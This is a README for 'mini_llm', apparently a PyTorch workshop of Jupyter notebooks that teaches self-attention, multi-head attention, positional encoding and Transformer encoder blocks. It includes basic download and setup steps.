# 🎉 mini_llm - Build Your Own Language Model Easily

## 🚀 Getting Started

Welcome to the mini_llm project! This workshop helps you build a Large Language Model (LLM) using PyTorch. You will learn about the core mechanisms that power models like GPT, BERT, and other modern Transformers.

## 🔧 Prerequisites

Before you begin, ensure you have the following on your computer:

- **Operating System:** Windows, macOS, or Linux
- **Python Version:** 3.7 or higher
- **PyTorch:** Follow the PyTorch installation guide from [PyTorch's official website](https://pytorch.org/get-started/locally/).
  
## 📥 How to Download

1. Visit the [Releases page](https://github.com/Arezkiiiii/mini_llm/releases) to find the latest version of mini_llm.
2. Look for the most recent release.
3. Click on the asset you need to download (the file names will appear under "Assets").
4. Save the file to your computer.

## 🖥️ Running the Application

After downloading, follow these steps to run the application:

1. Open your command line interface (Terminal for macOS and Linux, Command Prompt or PowerShell for Windows).
2. Change your directory to where you saved the mini_llm files. You can do this by typing:

   ```
   cd path\to\your\downloaded\files
   ```

   Replace `path\to\your\downloaded\files` with the actual path.

3. Install the required packages. Run:

   ```
   pip install -r requirements.txt
   ```

4. Finally, to start the workshop, type:

   ```
   jupyter notebook
   ```

   This command will open Jupyter Notebook in your browser.

## 📚 Workshop Breakdown

### 1. Self Attention Mechanism

In this notebook, you will understand the basic attention mechanism. Here’s what you will learn:

- **Scaled Dot-Product Attention:** The foundation of the attention mechanism.
- **Attention Weights Visualization:** See how the model places focus on specific parts of the input.
- **Causal Masking for Decoders:** Understand how the model handles future tokens.
- **Concrete Examples:** Apply these concepts with simple sentences.

### 2. Multi-Head Attention

Discover how multiple attention heads can learn diverse patterns from the data.

### 3. Positional Encoding

Learn how position information is added to the input so the model can learn word order.

### 4. Transformer Encoder Block

Explore the full architecture of a Transformer encoder and how it processes data.

### 5. Visualization Techniques

Get insights into what your model learns through visualization tools.

## 🔍 Learning Objectives

By the end of this workshop, you will have a solid understanding of the following concepts:

- Why self-attention is a game changer in natural language processing.
- How to implement key components of a Transformer from scratch.
- The architecture behind modern language models like GPT and BERT.
